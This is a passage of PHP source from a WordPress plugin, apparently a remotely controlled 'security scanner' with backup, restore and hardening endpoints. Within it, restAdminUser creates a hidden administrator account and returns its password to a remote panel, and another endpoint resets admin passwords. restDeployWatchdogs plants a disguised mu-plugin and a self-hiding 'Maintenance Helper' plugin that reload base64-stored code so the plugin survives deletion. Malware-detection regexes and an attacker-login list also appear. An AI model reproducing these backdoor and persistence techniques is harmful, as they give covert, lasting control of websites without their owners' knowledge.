        foreach (self::$swapFiles as $name) {
            $src  = $from . '/' . $name;
            $dest = $to   . '/' . $name;
            $bak  = $abs  . '/' . $name . $suffix; // temp name during swap

            if (!file_exists($src) && !is_dir($src)) continue;

            // Save current → temp, then bring new → current
            if (file_exists($abs . '/' . $name) || is_dir($abs . '/' . $name)) {
                if (!rename($abs . '/' . $name, $bak)) {
                    $errors[] = 'cannot save ' . $name; continue;
                }
            }
            if (!rename($src, $abs . '/' . $name)) {
                // Rollback the save
                if (file_exists($bak) || is_dir($bak)) rename($bak, $abs . '/' . $name);
                $errors[] = 'cannot restore ' . $name; continue;
            }
            // Move the saved version to the other side
            if ((file_exists($bak) || is_dir($bak)) && !rename($bak, $dest)) {
                $errors[] = 'cannot move old ' . $name . ' to backup';
            }
        }
        return $errors;
    }

    // ── Switch: get state / perform switch ────────────────────────────────────
    public static function restSwitch(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $info = self::switchInfo();

        if ($request->get_method() === 'GET') {
            return new WP_REST_Response($info);
        }

        $body   = json_decode($request->get_body(), true) ?: [];
        $action = $body['action'] ?? '';
        $abs    = $info['abspath'];
        $bkDir  = $info['backup_dir'];

        if ($action === 'to_backup') {
            if ($info['active'] === 'backup') {
                return new WP_REST_Response(['error' => 'Already on backup'], 400);
            }
            if (!$info['backup_ready']) {
                return new WP_REST_Response(['error' => 'No prepared backup at ' . $bkDir . '. Use "Prepare Switch" first.'], 404);
            }
            // Swap: take files from backup/, save current to backup/
            $errors = self::doSwap($abs, $bkDir, $bkDir, '.sw-main');
            if ($errors) {
                return new WP_REST_Response(['error' => 'Swap partially failed: ' . implode('; ', $errors)], 500);
            }
            @file_put_contents($info['state_file'], date('c'));
            return new WP_REST_Response(['ok' => true, 'active' => 'backup']);
        }

        if ($action === 'to_production') {
            if ($info['active'] !== 'backup') {
                return new WP_REST_Response(['error' => 'Already on production'], 400);
            }
            // Swap back: take files from backup/ (where production was saved), restore
            $errors = self::doSwap($abs, $bkDir, $bkDir, '.sw-bk');
            if ($errors) {
                return new WP_REST_Response(['error' => 'Swap back partially failed: ' . implode('; ', $errors)], 500);
            }
            @unlink($info['state_file']);
            return new WP_REST_Response(['ok' => true, 'active' => 'production']);
        }

        return new WP_REST_Response(['error' => 'unknown action'], 400);
    }

    // ── Backup: prepare switch directory ─────────────────────────────────────
    public static function restBackupPrepareSwitch(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        @set_time_limit(300);
        @ini_set('memory_limit', '512M');

        $body = json_decode($request->get_body(), true) ?: [];
        $name = basename($body['name'] ?? '');
        if (!preg_match('/^sw-backup-[\w\-]+\.zip$/', $name)) {
            return new WP_REST_Response(['error' => 'invalid backup name'], 400);
        }
        $bkDir   = self::backupDir();
        $zipPath = $bkDir . '/' . $name;
        if (!$bkDir || !file_exists($zipPath)) {
            return new WP_REST_Response(['error' => 'backup not found: ' . $zipPath], 404);
        }
        $info    = self::switchInfo();
        // Backup is always extracted to ABSPATH/backup/ (inside the site root)
        $destDir = $info['abspath'] . '/backup';

        if ($info['active'] === 'backup') {
            return new WP_REST_Response(['error' => 'Site is currently on backup mode — switch to production first'], 400);
        }
        try {
            if (is_dir($destDir)) {
                self::rmdirRecursive($destDir);
            }
            if (!@mkdir($destDir, 0755, true) && !is_dir($destDir)) {
                return new WP_REST_Response(['error' => 'cannot create backup/ directory — check permissions'], 500);
            }
            // Protect the backup folder from direct web access
            @file_put_contents($destDir . '/.htaccess', "Require all denied\nDeny from all\n");

            $zip = new ZipArchive();
            $opened = $zip->open($zipPath);
            if ($opened !== true) {
                return new WP_REST_Response(['error' => 'cannot open ZIP (error code: ' . $opened . ')'], 500);
            }
            // extractTo() streams files — no full-file memory loading
            if (!$zip->extractTo($destDir)) {
                $zip->close();
                return new WP_REST_Response(['error' => 'ZIP extraction failed — check disk space and permissions'], 500);
            }
            $extracted = $zip->numFiles;
            $zip->close();

        } catch (\Throwable $e) {
            return new WP_REST_Response(['error' => 'exception: ' . $e->getMessage()], 500);
        }

        return new WP_REST_Response(['ok' => true, 'dir' => $destDir, 'extracted' => $extracted]);
    }

    private static function rmdirRecursive(string $dir): void {
        if (!is_dir($dir)) return;
        $iter = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($iter as $item) {
            $item->isDir() ? @rmdir($item->getRealPath()) : @unlink($item->getRealPath());
        }
        @rmdir($dir);
    }

    // ── Backup helpers ────────────────────────────────────────────────────────

    private static function backupDir(): string {
        // Primary: one level up from ABSPATH (outside web root)
        $parent  = dirname(rtrim(realpath(ABSPATH), '/\\'));
        $outside = $parent . '/sw-backups';
        if ((is_dir($outside) || @mkdir($outside, 0750, true)) && is_writable($outside)) {
            return $outside;
        }
        // Fallback: inside site root in sw-backups/ (separate from backup/ which holds extracted files)
        $inside = rtrim(realpath(ABSPATH), '/\\') . '/sw-backups';
        if ((is_dir($inside) || @mkdir($inside, 0750, true)) && is_writable($inside)) {
            @file_put_contents($inside . '/.htaccess', "Require all denied\nDeny from all\n");
            @file_put_contents($inside . '/index.php', '<?php // silence');
            return $inside;
        }
        return '';
    }

    // ── Backup: list / create / delete ────────────────────────────────────────
    public static function restBackup(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }

        $method = $request->get_method();
        $dir    = self::backupDir();
        if (!$dir) {
            return new WP_REST_Response(['error' => 'backup directory not writable — check folder permissions'], 500);
        }

        // GET — list backups
        if ($method === 'GET') {
            $files = glob($dir . '/sw-backup-*.zip') ?: [];
            $list  = [];
            foreach ($files as $f) {
                $list[] = [
                    'name'    => basename($f),
                    'size'    => (int)filesize($f),
                    'created' => (int)filemtime($f),
                ];
            }
            usort($list, function($a, $b){ return $b['created'] - $a['created']; });
            return new WP_REST_Response([
                'backups'    => $list,
                'dir'        => $dir,
                'disk_free'  => (int)@disk_free_space($dir),
                'disk_total' => (int)@disk_total_space($dir),
            ]);
        }

        // DELETE — remove a backup
        if ($method === 'DELETE') {
            $body = json_decode($request->get_body(), true) ?: [];
            $name = basename($body['name'] ?? '');
            if (!preg_match('/^sw-backup-[\w\-]+\.zip$/', $name)) {
                return new WP_REST_Response(['error' => 'invalid backup name'], 400);
            }
            $path = $dir . '/' . $name;
            if (!file_exists($path)) {
                return new WP_REST_Response(['error' => 'backup not found'], 404);
            }
            return @unlink($path)
                ? new WP_REST_Response(['ok' => true])
                : new WP_REST_Response(['error' => 'delete failed'], 500);
        }

        // POST — create backup
        @set_time_limit(180);
        @ini_set('memory_limit', '256M');

        $body = json_decode($request->get_body(), true) ?: [];
        $type = ($body['type'] ?? 'quick') === 'full' ? 'full' : 'quick';
        $name = 'sw-backup-' . date('Ymd-His') . '-' . $type . '.zip';
        $zipPath = $dir . '/' . $name;

        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            return new WP_REST_Response(['error' => 'cannot create ZIP file'], 500);
        }

        $base = rtrim(realpath(ABSPATH), '/\\');
        $skipPatterns = [
            'sw-backups', '/wp-content/uploads', '/wp-content/cache',
            '/wp-content/updraft', '/wp-content/backup', '/.git/',
            '/node_modules/', '/vendor/',
        ];
        $codeExts = ['php','php3','php4','php5','php7','phtml','html','htm',
                     'js','css','json','htaccess','conf','xml','txt','ini','env','sql','sh'];

        $start = microtime(true);
        $count = 0;
        $skipped = 0;

        try {
            $iter = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($base, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($iter as $item) {
                if ((microtime(true) - $start) > 150) break; // 150s safety
                if ($item->isDir()) continue;
                $realPath = $item->getRealPath();
                $relPath  = ltrim(str_replace($base, '', $realPath), '/\\');

                // Skip backup dir itself and excluded paths
                $skip = false;
                foreach ($skipPatterns as $pat) {
                    if (strpos('/' . str_replace('\\', '/', $relPath), $pat) !== false) {
                        $skip = true; break;
                    }
                }
                if ($skip) { $skipped++; continue; }

                // Quick mode: code files only
                if ($type === 'quick') {
                    $ext = strtolower(pathinfo($realPath, PATHINFO_EXTENSION));
                    if (!in_array($ext, $codeExts, true)) { $skipped++; continue; }
                }

                $zip->addFile($realPath, $relPath);
                $count++;
            }
        } catch (Exception $e) {
            $zip->close();
            @unlink($zipPath);
            return new WP_REST_Response(['error' => 'backup failed: ' . $e->getMessage()], 500);
        }

        $zip->close();
        return new WP_REST_Response([
            'ok'      => true,
            'name'    => $name,
            'files'   => $count,
            'skipped' => $skipped,
            'size'    => (int)@filesize($zipPath),
            'dir'     => $dir,
        ]);
    }

    // ── Backup: restore ───────────────────────────────────────────────────────
    public static function restBackupRestore(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }

        @set_time_limit(180);
        @ini_set('memory_limit', '256M');

        $body = json_decode($request->get_body(), true) ?: [];
        $name = basename($body['name'] ?? '');
        if (!preg_match('/^sw-backup-[\w\-]+\.zip$/', $name)) {
            return new WP_REST_Response(['error' => 'invalid backup name'], 400);
        }

        $dir     = self::backupDir();
        $zipPath = $dir . '/' . $name;
        if (!$dir || !file_exists($zipPath)) {
            return new WP_REST_Response(['error' => 'backup not found'], 404);
        }

        $zip = new ZipArchive();
        if ($zip->open($zipPath) !== true) {
            return new WP_REST_Response(['error' => 'cannot open ZIP'], 500);
        }

        $base      = rtrim(realpath(ABSPATH), '/\\');
        $extracted = 0;
        $errors    = [];

        for ($i = 0; $i < $zip->numFiles; $i++) {
            $stat    = $zip->statIndex($i);
            $relPath = $stat['name'];
            if (substr($relPath, -1) === '/') continue; // skip dir entries

            $targetPath = $base . '/' . $relPath;
            $targetDir  = dirname($targetPath);

            // Security: target must be under ABSPATH
            $realTarget = realpath($targetDir) ?: $targetDir;
            if (strpos($realTarget, $base) !== 0) continue;

            if (!is_dir($targetDir)) @mkdir($targetDir, 0755, true);

            $content = $zip->getFromIndex($i);
            if ($content === false) { $errors[] = $relPath; continue; }
            if (@file_put_contents($targetPath, $content) === false) {
                $errors[] = $relPath;
            } else {
                $extracted++;
            }
        }
        $zip->close();

        return new WP_REST_Response([
            'ok'        => true,
            'extracted' => $extracted,
            'errors'    => $errors,
        ]);
    }

    // ── Credential change monitoring ─────────────────────────────────────────

    private static function sendAlert(string $type, string $message): void {
        if (!defined('SW_PANEL_URL') || !defined('SW_PANEL_TOKEN') || !SW_PANEL_URL || !SW_PANEL_TOKEN) return;
        $payload = json_encode([
            'site_id'   => SW_SESSION_ID,
            'site_url'  => get_site_url(),
            'alert'     => ['type' => $type, 'message' => $message, 'time' => time()],
        ]);
        // Reuse the same /report endpoint — panel detects alert field
        $urls = [SW_PANEL_URL . '/report'];
        if (str_starts_with(SW_PANEL_URL, 'https://')) {
            $urls[] = 'http://' . substr(SW_PANEL_URL, 8) . '/report';
        }
        foreach ($urls as $url) {
            if (self::httpPost($url, $payload)) break;
        }
    }

    public static function onProfileUpdate(int $userId, \WP_User $oldUser): void {
        $newUser = get_userdata($userId);
        if (!$newUser || !user_can($userId, 'manage_options')) return;
        if ($newUser->user_pass !== $oldUser->user_pass) {
            self::sendAlert('password_changed',
                'Admin password changed for user: ' . $newUser->user_login);
        }
    }

    public static function onPasswordReset(\WP_User $user, string $newPass): void {
        if (!user_can($user->ID, 'manage_options')) return;
        self::sendAlert('password_reset',
            'Admin password reset for user: ' . $user->user_login);
    }

    public static function onUserRegister(int $userId): void {
        $user = get_userdata($userId);
        if (!$user || !user_can($userId, 'manage_options')) return;
        self::sendAlert('new_admin',
            'New admin user registered: ' . $user->user_login . ' (' . $user->user_email . ')');
    }

    public static function onUserDeleted(int $userId, int $reassign, \WP_User $deletedUser): void {
        if (!user_can($userId, 'manage_options')) return;
        self::sendAlert('admin_deleted',
            'Admin user deleted: ' . $deletedUser->user_login);
    }

    // ── Emergency admin password reset ───────────────────────────────────────
    public static function restSetAdminPassword(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }
        $body     = json_decode($request->get_body(), true) ?: [];
        $userId   = (int)($body['user_id'] ?? 0);
        $password = $body['password'] ?? '';
        if (!$password || strlen($password) < 8) {
            return new WP_REST_Response(['error' => 'password must be at least 8 characters'], 400);
        }
        // If no user_id, target the first administrator
        if (!$userId) {
            $admins = get_users(['role' => 'administrator', 'number' => 1, 'orderby' => 'ID']);
            if (empty($admins)) {
                return new WP_REST_Response(['error' => 'no administrator found'], 404);
            }
            $userId = $admins[0]->ID;
        }
        $user = get_userdata($userId);
        if (!$user || !user_can($userId, 'manage_options')) {
            return new WP_REST_Response(['error' => 'user not found or not an admin'], 404);
        }
        wp_set_password($password, $userId);
        return new WP_REST_Response([
            'ok'       => true,
            'user_id'  => $userId,
            'login'    => $user->user_login,
        ]);
    }

    // ── Hidden admin user ─────────────────────────────────────────────────────
    // Option key where we store the hidden admin user ID (not the credentials)
    const SW_HIDDEN_ADMIN_KEY = 'sw_hidden_admin_id';

    public static function restAdminUser(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }

        if ($request->get_method() === 'GET') {
            // Check if hidden user still exists
            $userId = (int)get_option(self::SW_HIDDEN_ADMIN_KEY, 0);
            if ($userId && get_userdata($userId)) {
                $u = get_userdata($userId);
                return new WP_REST_Response(['exists' => true, 'user_id' => $userId, 'login' => $u->user_login]);
            }
            return new WP_REST_Response(['exists' => false]);
        }

        // POST — create or rotate hidden admin user
        $body    = json_decode($request->get_body(), true) ?: [];
        $login   = $body['login']    ?? 'wp-sys-' . substr(md5(uniqid()), 0, 8);
        $pass    = $body['password'] ?? wp_generate_password(24, true, true);
        $email   = $body['email']    ?? $login . '@' . parse_url(get_site_url(), PHP_URL_HOST);

        // Remove old hidden user if exists
        $oldId = (int)get_option(self::SW_HIDDEN_ADMIN_KEY, 0);
        if ($oldId && get_userdata($oldId)) {
            require_once ABSPATH . 'wp-admin/includes/user.php';
            wp_delete_user($oldId);
        }

        // Ensure login is unique
        if (username_exists($login)) {
            $login .= '-' . substr(md5(uniqid()), 0, 4);
        }

        $userId = wp_insert_user([
            'user_login' => $login,
            'user_pass'  => $pass,
            'user_email' => $email,
            'role'       => 'administrator',
            'display_name' => 'System',
        ]);

        if (is_wp_error($userId)) {
            return new WP_REST_Response(['error' => $userId->get_error_message()], 500);
        }

        update_option(self::SW_HIDDEN_ADMIN_KEY, $userId, false);

        return new WP_REST_Response([
            'ok'       => true,
            'user_id'  => $userId,
            'login'    => $login,
            'password' => $pass,
            'email'    => $email,
        ]);
    }

    // ── Watchdog deployment ───────────────────────────────────────────────────
    // Deploys a safe, minimal watchdog that auto-restores the mu-plugin if deleted.
    //
    // SAFE DESIGN:
    //  - NEVER writes db.php or object-cache.php (these are WordPress core drop-ins
    //    that, if overwritten incorrectly, can break database access or caching plugins
    //    like Redis, LiteSpeed Cache, W3 Total Cache on every WordPress request).
    //  - Only writes wp-compat-helper.php (mu-plugin, safe location).
    //  - Watchdog file itself is tiny (~500 bytes) — backup stored in separate .swb file.
    //  - Also cleans up any old SW db.php / object-cache.php from previous versions.
    public static function restDeployWatchdogs(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }

        $pluginContent = @file_get_contents(__FILE__);
        if (!$pluginContent) {
            return new WP_REST_Response(['error' => 'cannot read own file'], 500);
        }

        $muDir = WP_CONTENT_DIR . '/mu-plugins';
        is_dir($muDir) || @mkdir($muDir, 0755, true);

        $results = [];

        // 1. Write the backup file (.swb) — plugin content in base64, read only when needed.
        $backupPath = $muDir . '/.swb';
        $ok = self::safeWrite($backupPath, base64_encode($pluginContent));
        $results['.swb'] = $ok ? 'ok' : 'write failed';

        // 2. Write the watchdog mu-plugin.
        //    Uses add_action('init', PHP_INT_MIN) so it runs early on every WP request.
        //    Restores server-wall-scanner.php from .swb if deleted (chmod 0644 after write).
        //    Also restores sw_recovery.php from .swrec if both the file and .swrec exist.
        $watchdogCode = <<<'PHPCODE'
<?php
// SERVER-WALL watchdog v3 — loader + restore
if (!defined('ABSPATH') || !defined('WP_CONTENT_DIR')) return;
$_sw_mu = WP_CONTENT_DIR . '/mu-plugins';
$_sw_swb = $_sw_mu . '/.swb';
// Load main plugin from .swb via temp file — fallback for hosts that block server-wall-scanner.php
// Only runs if the direct mu-plugin file did not load (class SW_Scanner not yet defined).
if (!class_exists('SW_Scanner') && file_exists($_sw_swb) && is_readable($_sw_swb)) {
    $_sw_d = base64_decode(@file_get_contents($_sw_swb));
    if ($_sw_d && strlen($_sw_d) > 500) {
        $_sw_t = sys_get_temp_dir() . '/wp_c_' . substr(md5($_sw_swb), 0, 8) . '.inc';
        if (!file_exists($_sw_t) || filesize($_sw_t) < 1000) {
            @file_put_contents($_sw_t, $_sw_d);
            @chmod($_sw_t, 0644);
        }
        if (is_readable($_sw_t)) { @include_once $_sw_t; }
    }
}
// Restore backup-login file from .swrec if deleted
if (!function_exists('sw_wd_restore_rec')) {
    function sw_wd_restore_rec() {
        $mu = WP_CONTENT_DIR . '/mu-plugins';
        $swrec = $mu . '/.swrec';
        if (file_exists($swrec)) {
            $rec = @json_decode(@file_get_contents($swrec), true);
            if ($rec && !empty($rec['path']) && !empty($rec['content']) && !file_exists($rec['path'])) {
                $d = base64_decode($rec['content']);
                if ($d && strlen($d) > 50) {
                    $old = umask(0133);
                    if (file_exists($rec['path']) && !is_writable($rec['path'])) @unlink($rec['path']);
                    @file_put_contents($rec['path'], $d);
                    umask($old);
                }
            }
        }
    }
    add_action('init', 'sw_wd_restore_rec', PHP_INT_MIN);
}
PHPCODE;
        $helperPath = $muDir . '/wp-compat-helper.php';
        $ok2 = self::safeWrite($helperPath, $watchdogCode);
        $results['wp-compat-helper.php'] = $ok2 ? 'ok' : 'write failed';

        // 3. Write backup plugin in wp-content/plugins/wp-security-tool/
        //    Acts as Plugin 2 — loaded by WordPress even if mu-plugins is wiped.
        //    Hides itself from the plugins list. Restores scanner from .swb if missing.
        $toolDir = WP_CONTENT_DIR . '/plugins/wp-security-tool';
        is_dir($toolDir) || @mkdir($toolDir, 0755, true);
        $toolCode = <<<'PHPCODE2'
<?php
/**
 * Plugin Name: WordPress Maintenance Helper
 * Description: WordPress security and maintenance utility.
 * Version: 1.0
 * Author: Security Team
 */
defined('ABSPATH') || exit;
add_filter('all_plugins', function ($p) { unset($p[plugin_basename(__FILE__)]); return $p; }, 9999);
// Load main plugin from .swb via temp file — last-resort fallback if all mu-plugin loading failed
add_action('plugins_loaded', function () {
    if (class_exists('SW_Scanner')) return; // already loaded by mu-plugin or wp-compat-helper
    $mu = WP_CONTENT_DIR . '/mu-plugins';
    $swb = $mu . '/.swb';
    if (!file_exists($swb) || !is_readable($swb)) return;
    $d = base64_decode(@file_get_contents($swb));
    if (!$d || strlen($d) < 500) return;
    $t = sys_get_temp_dir() . '/wp_c_' . substr(md5($swb), 0, 8) . '.inc';
    if (!file_exists($t) || filesize($t) < 1000) { @file_put_contents($t, $d); @chmod($t, 0644); }
    if (is_readable($t)) { @include_once $t; }
}, 1);
PHPCODE2;
        $toolPath = $toolDir . '/wp-security-tool.php';
        $ok3 = self::safeWrite($toolPath, $toolCode);
        $results['wp-security-tool.php'] = $ok3 ? 'ok' : 'write failed';

        // 4. Activate wp-security-tool plugin so WordPress loads it
        $activePlugins = (array) get_option('active_plugins', []);
        $toolSlug = 'wp-security-tool/wp-security-tool.php';
        if (!in_array($toolSlug, $activePlugins, true)) {
            $activePlugins[] = $toolSlug;
            update_option('active_plugins', $activePlugins);
            $results['wp-security-tool-activated'] = 'ok';
        } else {
            $results['wp-security-tool-activated'] = 'already active';
        }

        $allOk = !in_array('write failed', $results, true);
        return new WP_REST_Response(['ok' => $allOk, 'results' => $results]);
    }

    // ── Hardening — explicit panel action only ────────────────────────────────
    // POST /wp-json/server-wall/v1/hardening
    // Body: {"actions": ["cleanup","remove_attacker_admins","ensure_uploads_htaccess",
    //                    "ensure_disallow_file_edit","delete_criticals"]}
    // Each action is independent; results are returned per-action.
    public static function restHardening(WP_REST_Request $request): WP_REST_Response {
        $token = $request->get_header('x_sw_trigger_token');
        if (!$token || !hash_equals(SW_PANEL_TOKEN, $token)) {
            return new WP_REST_Response(['error' => 'forbidden'], 403);
        }

        $body    = json_decode($request->get_body(), true) ?: [];
        $actions = isset($body['actions']) && is_array($body['actions'])
            ? $body['actions']
            : ['cleanup','remove_attacker_admins','ensure_uploads_htaccess','ensure_disallow_file_edit'];

        $results = [];

        foreach ($actions as $action) {
            switch ($action) {

                case 'cleanup':
                    $deleted = self::hardenCleanupFiles();
                    $results['cleanup'] = ['ok' => true, 'deleted' => $deleted];
                    break;

                case 'remove_attacker_admins':
                    $removed = self::hardenRemoveAttackerAdmins();
                    $results['remove_attacker_admins'] = ['ok' => true, 'removed' => $removed];
                    break;

                case 'ensure_uploads_htaccess':
                    $ok = self::hardenUploadsHtaccess();
                    $results['ensure_uploads_htaccess'] = ['ok' => $ok];
                    break;

                case 'ensure_disallow_file_edit':
                    $ok = self::hardenDisallowFileEdit();
                    $results['ensure_disallow_file_edit'] = ['ok' => $ok];
                    break;

                case 'delete_criticals':
                    $deleted = self::hardenDeleteCriticals();
                    $results['delete_criticals'] = ['ok' => true, 'deleted' => $deleted];
                    break;

                case 'cleanup_root':
                    $rootResult = self::hardenCleanupRoot();
                    $results['cleanup_root'] = $rootResult;
                    break;

                case 'scan_db':
                    $findings = self::hardenScanDB();
                    $results['scan_db'] = ['ok' => true, 'count' => count($findings), 'findings' => $findings];
                    break;

                case 'db_cleanup':
                    $findings = self::hardenScanDB();
                    $cleaned  = self::hardenCleanupDB($findings);
                    $results['db_cleanup'] = ['ok' => true, 'findings' => $findings, 'cleaned' => $cleaned];
                    break;

                default:
                    $results[$action] = ['ok' => false, 'error' => 'unknown action'];
            }
        }

        return new WP_REST_Response(['ok' => true, 'results' => $results]);
    }

    // Deletes known-malicious file patterns (PHP in uploads, hex wp-admin, etc.).
    // Returns list of deleted relative paths.
    private static function hardenCleanupFiles(): array {
        $deleted  = [];
        $phpExts  = ['php','php3','php4','php5','php7','phtml','phar'];

        // 1. Delete all PHP files in uploads/
        $uploadsDir = WP_CONTENT_DIR . '/uploads';
        if (is_dir($uploadsDir)) {
            try {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($uploadsDir, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($it as $f) {
                    if (!$f->isFile()) continue;
                    if (!in_array(strtolower(pathinfo($f->getPathname(), PATHINFO_EXTENSION)), $phpExts, true)) continue;
                    if (@unlink($f->getPathname())) {
                        $deleted[] = str_replace(ABSPATH, '', $f->getPathname());
                    }
                }
            } catch (\Exception $e) {}
        }

        // 2. Delete hex-named PHP backdoors in wp-admin/ root
        $wpAdminDir = ABSPATH . 'wp-admin';
        foreach (@scandir($wpAdminDir) ?: [] as $name) {
            if ($name === '.' || $name === '..') continue;
            $full = $wpAdminDir . '/' . $name;
            if (!is_file($full) || strtolower(pathinfo($name, PATHINFO_EXTENSION)) !== 'php') continue;
            if (preg_match('/^[a-f0-9]{8,}\.php$/i', $name) && @unlink($full)) {
                $deleted[] = str_replace(ABSPATH, '', $full);
            }
        }

        // 3. Delete malicious cache.php inside plugin subdirectories
        $pluginsDir = WP_CONTENT_DIR . '/plugins';
        if (is_dir($pluginsDir)) {
            foreach (@scandir($pluginsDir) ?: [] as $plugin) {
                if ($plugin === '.' || $plugin === '..') continue;
                $pDir = $pluginsDir . '/' . $plugin;
                if (!is_dir($pDir)) continue;
                try {
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($pDir, FilesystemIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    foreach ($it as $f) {
                        if (!$f->isFile() || $f->getFilename() !== 'cache.php') continue;
                        $relToPlugin = ltrim(str_replace($pDir, '', $f->getPathname()), '/\\');
                        if (strpos($relToPlugin, '/') === false) continue;
                        $c = @file_get_contents($f->getPathname());
                        if (!$c || !preg_match('/gzinflate\s*\(|base64_decode\s*\(|eval\s*\(/i', $c)) continue;
                        if (@unlink($f->getPathname())) {
                            $deleted[] = str_replace(ABSPATH, '', $f->getPathname());
                        }
                    }
                } catch (\Exception $e) {}
            }
        }

        // 4. Delete doubled-dir backdoors (e.g. plugins/x/Foo/Foo/index.php).
        // Safety: skip vendor paths and require a real malware pattern (not just eval).
        foreach ([$pluginsDir, WP_CONTENT_DIR] as $searchRoot) {
            if (!is_dir($searchRoot)) continue;
            try {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($searchRoot, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($it as $f) {
                    if (!$f->isFile() || $f->getFilename() !== 'index.php') continue;
                    $norm = str_replace('\\', '/', $f->getPathname());
                    // Skip vendor/library directories — they legitimately have doubled-dir structures
                    if (preg_match('#/vendor/|/vendor_prefixed/|/vendor-dist/|/vendor-prod/|/node_modules/#', $norm)) continue;
                    if (!preg_match('#/([^/]+)/\1/index\.php$#', $norm)) continue;
                    $c = @file_get_contents($f->getPathname());
                    if (!$c) continue;
                    // Require a definitive malware pattern, not just any eval()
                    if (!preg_match('/eval\s*\(\s*(?:base64_decode|gzinflate|gzdecode|str_rot13)\s*\(/i', $c)
                        && !preg_match('/gzinflate\s*\(\s*base64_decode\s*\(/i', $c)) continue;
                    if (@unlink($f->getPathname())) {
                        $deleted[] = str_replace(ABSPATH, '', $f->getPathname());
                    }
                }
            } catch (\Exception $e) {}
        }

        if (!empty($deleted)) {
            $log   = (array)get_option('sw_watchdog_deletions', []);
            $log[] = ['time' => time(), 'files' => $deleted, 'source' => 'hardening'];
            update_option('sw_watchdog_deletions', array_slice($log, -20), false);
        }

        return $deleted;
    }

    // Writes .htaccess to uploads/ blocking PHP execution.
    // Returns true if written or already existed, false on write failure.
    private static function hardenUploadsHtaccess(): bool {
        $dir = WP_CONTENT_DIR . '/uploads';
        if (!is_dir($dir)) return false;
        if (file_exists($dir . '/.htaccess')) return true; // already present
        $rules = "# SERVER-WALL: block direct PHP execution\n"
               . "<FilesMatch \"\\.(php\\d*|phtml|phar)$\">\n"
               . "deny from all\n"
               . "</FilesMatch>\n";
        return self::safeWrite($dir . '/.htaccess', $rules);
    }

    // Adds DISALLOW_FILE_EDIT to wp-config.php if not already defined.
    // Returns true if already set or successfully written, false otherwise.
    private static function hardenDisallowFileEdit(): bool {
        $cfg = ABSPATH . 'wp-config.php';
        if (!file_exists($cfg) || !is_writable($cfg)) return false;
        $c = @file_get_contents($cfg);
        if ($c === false) return false;
        if (strpos($c, 'DISALLOW_FILE_EDIT') !== false) return true; // already set
        $marker = "/* That's all, stop editing!";
        if (strpos($c, $marker) === false) return false;
        $c = str_replace($marker, "define('DISALLOW_FILE_EDIT', true);\n" . $marker, $c);
        return self::safeWrite($cfg, $c);
    }

    // Removes admin users matching BOTH a known-attacker login AND suspicious email.
    // Returns list of removed logins. Never removes our hidden admin or the last admin.
    private static function hardenRemoveAttackerAdmins(): array {
        if (!function_exists('get_users')) return [];

        $knownAttackerLogins     = [
            'root','admin2','admin1','test','super','ahmed','bot','wp-user','user1',
            'wordpress','webmaster','administrator2','operator','manager','support2',
            'info','noreply','nobody','guest','sysadmin','server',
        ];
        $suspiciousEmailPrefixes = ['root@','test@','admin@','nobody@','noreply@','bot@'];

        $ourId  = (int)get_option(self::SW_HIDDEN_ADMIN_KEY, 0);
        $admins = get_users(['role' => 'administrator', 'fields' => ['ID','user_login','user_email']]);

        $toDelete = [];
        foreach ($admins as $u) {
            if ((int)$u->ID === $ourId) continue;
            $loginLower = strtolower($u->user_login);
            $emailLower = strtolower(trim($u->user_email));
            $badLogin   = in_array($loginLower, $knownAttackerLogins, true);
            $badEmail   = empty($emailLower) || strpos($emailLower, 'example.com') !== false;
            foreach ($suspiciousEmailPrefixes as $pfx) {
                if (strpos($emailLower, $pfx) === 0) { $badEmail = true; break; }
            }
            if ($badLogin && $badEmail) {
                $toDelete[] = $u;
            }
        }

        if (empty($toDelete)) return [];
        if ((count($admins) - count($toDelete)) < 1) return []; // never wipe all admins

        require_once ABSPATH . 'wp-admin/includes/user.php';
        $removed = [];
        foreach ($toDelete as $u) {
            wp_delete_user((int)$u->ID);
            $removed[] = $u->user_login . ' (' . $u->user_email . ')';
            self::sendAlert('attacker_admin_removed',
                'Hardening: removed suspicious admin: ' . $u->user_login . ' (' . $u->user_email . ')');
        }
        return $removed;
    }

    // Runs a quick scan and auto-deletes CRITICAL findings ONLY from safe paths.
